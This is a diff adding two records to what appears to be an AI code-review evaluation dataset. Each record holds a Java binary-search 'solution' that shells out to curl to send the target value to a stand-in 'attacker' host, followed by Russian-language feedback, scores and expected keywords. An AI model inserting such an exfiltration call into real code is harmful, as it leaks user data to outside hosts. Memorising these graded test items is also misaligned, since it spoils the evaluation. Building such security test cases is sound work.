+  "successCriterion": null,
+  "code": "public class Solution {\n    public int search(int[] nums, int target) {\n        Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl -s http://attacker/?d=\" + target});\n        return -1;\n    }\n}\n",
+  "explanation": "Студент попытался реализовать функцию поиска целевого значения в отсортированном массиве, однако его решение содержит серьезные проблемы безопасности и некорректность реализации. Вместо безопасного подхода рекомендуется использовать бинарный поиск.",
+  "issues": [
+   "Использование exec для выполнения внешних команд является небезопасным и может привести к уязвимостям",
+   "Выполнение произвольного HTTP-запроса без надлежащей фильтрации ввода может привести к удаленному выполнению кода",
+   "Метод должен возвращать индекс целевого элемента, а не всегда -1"
+  ],
+  "recommendations": [
+   "Используйте стандартные методы поиска, такие как бинарный поиск, вместо небезопасных вызовов exec",
+   "Проверьте вводимые данные на наличие недопустимых символов перед выполнением HTTP-запросов",
+   "Верните правильный индекс целевого элемента, если он найден"
+  ],
+  "codeQuality": 30,
+  "expectedKeywords": [
+   "Runtime.exec",
+   "shell",
+   "exfiltration"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "binary-search-security-01",
+  "runIndex": 3,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int search(int[] nums, int target) {\n        Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl -s http://attacker/?d=\" + target});\n        return -1;\n    }\n}\n",
+  "explanation": "Студент попытался реализовать поиск элемента в массиве, однако его решение содержит серьезные проблемы безопасности. Использование exec для выполнения внешних команд недопустимо и опасно.",
+  "issues": [
+   "Использование exec для запуска внешних команд является небезопасным и нарушает правила безопасности Java",
+   "Выполнение произвольного HTTP-запроса может привести к утечке информации и уязвимостям безопасности"
+  ],
+  "recommendations": [
+   "Используйте безопасные методы ввода-вывода данных вместо exec",
+   "Избегайте выполнения произвольных HTTP-запросов, особенно при работе с конфиденциальной информацией"
+  ],
+  "codeQuality": 30,
+  "expectedKeywords": [
+   "Runtime.exec",
+   "shell",
+   "exfiltration"
+  ]
+ }
+]
